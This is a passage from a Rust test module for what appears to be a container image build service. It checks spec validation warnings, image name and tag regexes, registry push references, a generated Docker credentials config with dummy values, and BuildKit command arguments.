        let w = validate_spec(&s, &permissive).unwrap();
        assert!(w.iter().any(|m| m.contains("latest")));
        assert!(w.iter().any(|m| m.contains("raw RUN")));
    }

    #[test]
    fn names_tags_and_push_plumbing() {
        assert!(image_name_re().is_match("ray/team"));
        assert!(image_name_re().is_match("spike"));
        assert!(!image_name_re().is_match("Ray"));
        assert!(!image_name_re().is_match("a//b"));
        assert!(tag_re().is_match("2.56.0-py312"));
        assert!(!tag_re().is_match("bad tag"));
        assert_eq!(
            push_reference("reg:8080", "ray", "team", "1.0"),
            "reg:8080/ray/team:1.0"
        );
        let cfg: serde_json::Value =
            serde_json::from_str(&docker_config_json("reg:8080", "alice", "tok")).unwrap();
        let auth = cfg["auths"]["reg:8080"]["auth"].as_str().unwrap();
        assert_eq!(
            base64::engine::general_purpose::STANDARD
                .decode(auth)
                .unwrap(),
            b"alice:tok"
        );
        let args = buildctl_args(&settings(), "/tmp/ctx", "reg:8080/ray/team:1.0");
        assert_eq!(args[0], "--addr");
        assert!(args.contains(&"attest:provenance=mode=max".to_string()));
        assert!(args.last().unwrap().contains("registry.insecure=true"));
        assert!(args.last().unwrap().contains("push=true"));
    }

    #[test]
    fn settings_default_insecure_for_in_cluster_addresses() {
        // Env-free defaults: disabled, conservative.
        let s = ImageBuildSettings {
            buildkit_addr: None,
            ..settings()
        };
        assert!(!s.enabled());
    }
}
